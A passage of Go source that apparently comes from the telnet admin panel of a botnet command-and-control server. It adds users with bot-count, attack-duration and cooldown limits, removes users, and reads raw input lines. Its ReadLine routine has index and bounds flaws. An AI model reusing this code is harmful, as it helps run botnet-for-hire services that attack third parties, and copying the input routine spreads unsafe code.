		success = database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown)
	}

	if success {
		this.conn.Write([]byte("\x1b[1;32mUser created successfully!\x1b[0m\r\n"))
	} else {
		this.conn.Write([]byte("\x1b[1;31mFailed to create user (may already exist)\x1b[0m\r\n"))
	}
}

func (this *Admin) handleRemoveUser() {
	this.conn.Write([]byte("\x1b[1;32mUsername to remove:\x1b[0m "))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if database.RemoveUser(username) {
		this.conn.Write([]byte("\x1b[1;32mUser removed\x1b[0m\r\n"))
	} else {
		this.conn.Write([]byte("\x1b[1;31mUser not found\x1b[0m\r\n"))
	}
}

func (this *Admin) ReadLine(password bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			return string(buf[:bufPos]), nil
		}
		if !password {
			this.conn.Write(buf[bufPos : bufPos+1])
		}
		bufPos++
	}
}
